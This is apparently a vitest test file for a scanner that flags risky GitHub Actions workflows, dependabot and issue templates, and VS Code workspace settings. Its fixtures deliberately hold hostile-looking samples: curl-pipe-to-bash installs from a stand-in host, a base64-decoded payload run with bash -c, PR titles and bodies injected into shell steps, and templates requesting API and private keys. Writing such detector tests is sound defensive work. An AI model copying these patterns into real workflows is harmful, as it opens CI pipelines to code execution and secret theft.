import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import path from "node:path";
import { tmpdir } from "node:os";
import { afterEach, describe, expect, it } from "vitest";

import {
  formatGithubMetadataScanResult,
  scanGithubMetadata
} from "../src";

const tempDirs: string[] = [];

async function writeRepoFile(rootPath: string, relativePath: string, content: string): Promise<void> {
  const targetPath = path.join(rootPath, relativePath);
  await mkdir(path.dirname(targetPath), { recursive: true });
  await writeFile(targetPath, content, "utf8");
}

afterEach(async () => {
  await Promise.all(tempDirs.splice(0).map(async (dirPath) => {
    await rm(dirPath, { recursive: true, force: true });
  }));
});

describe("scanGithubMetadata", () => {
  it("detects high-risk workflow patterns", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/release.yml", `name: release
on:
  pull_request_target:
jobs:
  ship:
    runs-on: [self-hosted, linux]
    permissions:
      contents: write
      id-token: write
    steps:
      - uses: actions/checkout@v4
      - run: curl https://example.invalid/install.sh | bash
      - uses: vendor/security-action@main
      - name: Checkout PR head
        with:
          ref: \${{ github.event.pull_request.head.sha }}
`);

    const result = await scanGithubMetadata(rootPath);
    const findingIds = result.findings.map((finding) => finding.id);

    expect(result.scannedFiles).toEqual([".github/workflows/release.yml"]);
    expect(findingIds).toEqual(expect.arrayContaining([
      "WG-GHWF-003",
      "WG-GHWF-002",
      "WG-GHWF-004",
      "WG-GHWF-005",
      "WG-GHWF-006",
      "WG-GHWF-008",
      "WG-GHWF-009"
    ]));
  });

  it("detects dangerous dependabot and template settings", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/dependabot.yml", `version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
    insecure-external-code-execution: allow
`);
    await writeRepoFile(rootPath, ".github/ISSUE_TEMPLATE/bug.md", `Please provide your API key so we can reproduce the issue.
If that fails, run: curl https://example.invalid/install.sh | bash
`);
    await writeRepoFile(rootPath, ".github/PULL_REQUEST_TEMPLATE.md", `Please attach the private key used in CI if the build failed.
`);

    const result = await scanGithubMetadata(rootPath);
    const findingIds = result.findings.map((finding) => finding.id);

    expect(findingIds).toEqual(expect.arrayContaining([
      "WG-GHDB-001",
      "WG-GHTM-001",
      "WG-GHTM-002"
    ]));
  });

  it("flags repository-wide CODEOWNERS entries for manual review", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/CODEOWNERS", `* @security-team
docs/** @docs-team
`);

    const result = await scanGithubMetadata(rootPath);

    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        id: "WG-GHCO-001",
        severity: "info",
        file: ".github/CODEOWNERS",
        line: 1
      })
    ]));
  });

  it("returns no findings for minimally privileged workflows", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/ci.yml", `name: ci
on:
  pull_request:
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332
      - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8
      - run: npm test
`);

    const result = await scanGithubMetadata(rootPath);

    expect(result.findings).toEqual([]);
    expect(formatGithubMetadataScanResult(result)).toContain("No repository-trust findings");
  });

  it("detects risky workspace settings, task automation, and extension recommendations", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".vscode/settings.json", `{
  "terminal.integrated.defaultProfile.linux": "danger",
  "task.allowAutomaticTasks": "on"
}`);
    await writeRepoFile(rootPath, ".vscode/tasks.json", `{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "build",
      "type": "shell",
      "command": "latexmk -pdf main.tex",
      "runOptions": {
        "runOn": "folderOpen"
      }
    }
  ]
}`);
    await writeRepoFile(rootPath, ".vscode/launch.json", `{
  "version": "0.2.0",
  "configurations": [
    {
      "name": "Attach",
      "type": "node",
      "request": "launch",
      "preLaunchTask": "build"
    }
  ]
}`);
    await writeRepoFile(rootPath, ".vscode/extensions.json", `{
  "recommendations": [
    "LaTeX-Secure-Workspace",
    "example.shell-runner"
  ]
}`);
    await writeRepoFile(rootPath, "main.tex", `\\documentclass{article}
\\begin{document}
Hello
\\end{document}
`);

    const result = await scanGithubMetadata(rootPath);
    const findingIds = result.findings.map((finding) => finding.id);

    expect(findingIds).toEqual(expect.arrayContaining([
      "WG-WS-001",
      "WG-WS-002",
      "WG-WS-003",
      "WG-WS-004",
      "WG-WS-005",
      "WG-WS-007"
    ]));
    expect(result.scannedFiles).toEqual(expect.arrayContaining([
      ".vscode/settings.json",
      ".vscode/tasks.json",
      ".vscode/launch.json",
      ".vscode/extensions.json",
      "main.tex"
    ]));
  });

  it("flags LaTeX workspaces that recommend extensions outside the approved LaTeX set", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".vscode/extensions.json", `{
  "recommendations": [
    "example.latex-helper"
  ]
}`);
    await writeRepoFile(rootPath, "paper.sty", `% custom style`);

    const result = await scanGithubMetadata(rootPath, {
      recommendedLatexExtensionIds: ["LaTeX-Secure-Workspace"]
    });

    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        id: "WG-WS-006",
        file: ".vscode/extensions.json"
      })
    ]));
  });

  it("flags workflows without explicit permissions", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/unpinned-perms.yml", `name: unpinned permissions
on:
  push:
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332
      - run: npm test
`);

    const result = await scanGithubMetadata(rootPath);

    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        id: "WG-GHWF-010",
        severity: "info"
      })
    ]));
  });

  it("flags reusable workflow secret inheritance and untrusted interpolation", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/reusable-risk.yml", `name: reusable risk
on:
  workflow_dispatch:
jobs:
  call-other:
    uses: vendor/reusable/.github/workflows/deploy.yml@main
    secrets: inherit
  shell-risk:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - run: echo "\${{ github.event.pull_request.title }}"
`);

    const result = await scanGithubMetadata(rootPath);
    const findingIds = result.findings.map((finding) => finding.id);

    expect(findingIds).toEqual(expect.arrayContaining([
      "WG-GHWF-004",
      "WG-GHWF-017",
      "WG-GHWF-011",
      "WG-GHWF-012",
      "WG-GHWF-015"
    ]));
  });

  it("detects obfuscated shell execution and mutable docker action references", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/obfuscated.yml", `name: obfuscated
on:
  pull_request:
permissions:
  contents: read
jobs:
  suspicious:
    runs-on: ubuntu-latest
    steps:
      - uses: docker://alpine:3.20
      - run: |
          PAYLOAD=$(echo ZWNobyBoaQ== | base64 -d)
          bash -c "$PAYLOAD"
`);

    const result = await scanGithubMetadata(rootPath);
    const findingIds = result.findings.map((finding) => finding.id);

    expect(findingIds).toEqual(expect.arrayContaining([
      "WG-GHWF-006",
      "WG-GHWF-016"
    ]));
  });

  it("tracks tainted env values into shell execution", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/tainted-env.yml", `name: tainted env
on:
  pull_request:
permissions:
  contents: read
env:
  PR_TITLE: \${{ github.event.pull_request.title }}
jobs:
  suspicious:
    runs-on: ubuntu-latest
    steps:
      - run: |
          printf '%s\\n' "$PR_TITLE"
          bash -c "$PR_TITLE"
`);

    const result = await scanGithubMetadata(rootPath);

    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        id: "WG-GHWF-018",
        file: ".github/workflows/tainted-env.yml"
      })
    ]));
  });

  it("tracks tainted values propagated through GITHUB_OUTPUT into later steps", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/tainted-output.yml", `name: tainted output
on:
  pull_request:
permissions:
  contents: read
jobs:
  suspicious:
    runs-on: ubuntu-latest
    steps:
      - id: prepare
        run: echo "payload=\${{ github.event.pull_request.title }}" >> "$GITHUB_OUTPUT"
      - run: bash -c "\${{ steps.prepare.outputs.payload }}"
`);

    const result = await scanGithubMetadata(rootPath);

    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        id: "WG-GHWF-011",
        file: ".github/workflows/tainted-output.yml"
      })
    ]));
  });

  it("flags user-controlled expressions passed into action inputs", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/tainted-with.yml", `name: tainted with
on:
  pull_request:
permissions:
  contents: read
jobs:
  suspicious:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea
        with:
          script: \${{ github.event.pull_request.body }}
      - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332
        with:
          ref: \${{ github.event.pull_request.head.ref }}
`);

    const result = await scanGithubMetadata(rootPath);
    const findings = result.findings.filter((finding) => finding.id === "WG-GHWF-019");

    expect(findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        file: ".github/workflows/tainted-with.yml",
        severity: "high"
      }),
      expect.objectContaining({
        file: ".github/workflows/tainted-with.yml",
        severity: "medium"
      })
    ]));
  });

  it("tracks tainted values across needs job outputs", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/needs-output.yml", `name: needs output
on:
  pull_request:
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      payload: \${{ steps.prepare.outputs.payload }}
    steps:
      - id: prepare
        run: echo "payload=\${{ github.event.pull_request.title }}" >> "$GITHUB_OUTPUT"
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: bash -c "\${{ needs.build.outputs.payload }}"
`);

    const result = await scanGithubMetadata(rootPath);

    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        id: "WG-GHWF-011",
        file: ".github/workflows/needs-output.yml"
      })
    ]));
  });

  it("scans local reusable workflow files that are invoked by caller workflows", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/caller.yml", `name: caller
on:
  pull_request:
permissions:
  contents: read
jobs:
  delegate:
    uses: ./.github/workflows/reusable.yml
`);
    await writeRepoFile(rootPath, ".github/workflows/reusable.yml", `name: reusable
on:
  workflow_call:
jobs:
  dangerous:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - run: echo \${{ github.event.pull_request.title }}
`);

    const result = await scanGithubMetadata(rootPath);

    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        id: "WG-GHWF-003",
        file: ".github/workflows/reusable.yml"
      }),
      expect.objectContaining({
        id: "WG-GHWF-011",
        file: ".github/workflows/reusable.yml"
      })
    ]));
  });

  it("propagates tainted caller inputs into local reusable workflow sinks", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/caller.yml", `name: caller
on:
  pull_request:
permissions:
  contents: read
jobs:
  delegate:
    uses: ./.github/workflows/reusable.yml
    with:
      script_body: \${{ github.event.pull_request.body }}
`);
    await writeRepoFile(rootPath, ".github/workflows/reusable.yml", `name: reusable
on:
  workflow_call:
    inputs:
      script_body:
        required: true
        type: string
jobs:
  dangerous:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - run: bash -c "\${{ inputs.script_body }}"
`);

    const result = await scanGithubMetadata(rootPath);

    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        id: "WG-GHWF-011",
        file: ".github/workflows/reusable.yml"
      })
    ]));
  });

  it("does not flag local reusable workflow inputs when caller passes safe constants", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/caller.yml", `name: caller
on:
  pull_request:
permissions:
  contents: read
jobs:
  delegate:
    uses: ./.github/workflows/reusable.yml
    with:
      script_body: echo safe
`);
    await writeRepoFile(rootPath, ".github/workflows/reusable.yml", `name: reusable
on:
  workflow_call:
    inputs:
      script_body:
        required: true
        type: string
jobs:
  safe:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - run: printf '%s\\n' "\${{ inputs.script_body }}"
`);

    const result = await scanGithubMetadata(rootPath);
    const reusableWorkflowInputFindings = result.findings.filter((finding) => (
      finding.file === ".github/workflows/reusable.yml"
      && ["WG-GHWF-011", "WG-GHWF-018", "WG-GHWF-019"].includes(finding.id)
    ));

    expect(reusableWorkflowInputFindings).toEqual([]);
  });

  it("resolves external reusable workflows when opt-in resolver is enabled", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    const externalReference = "vendor/reusable/.github/workflows/deploy.yml@0123456789abcdef0123456789abcdef01234567";
    await writeRepoFile(rootPath, ".github/workflows/caller.yml", `name: caller
on:
  pull_request:
permissions:
  contents: read
jobs:
  deploy:
    uses: ${externalReference}
    with:
      script_body: \${{ github.event.pull_request.body }}
`);

    const result = await scanGithubMetadata(rootPath, {
      resolveExternalWorkflows: true,
      externalWorkflowResolver: {
        resolve: async (reference) => {
          if (reference !== externalReference) {
            return undefined;
          }

          return {
            file: `external:${reference}`,
            content: `name: deploy
on:
  workflow_call:
    inputs:
      script_body:
        required: true
        type: string
jobs:
  dangerous:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - run: bash -c "\${{ inputs.script_body }}"
`
          };
        }
      }
    });

    expect(result.scannedFiles).toContain(`external:${externalReference}`);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        id: "WG-GHWF-011",
        file: `external:${externalReference}`
      })
    ]));
    expect(result.findings.some((finding) => finding.id === "WG-GHWF-017")).toBe(false);
  });
});
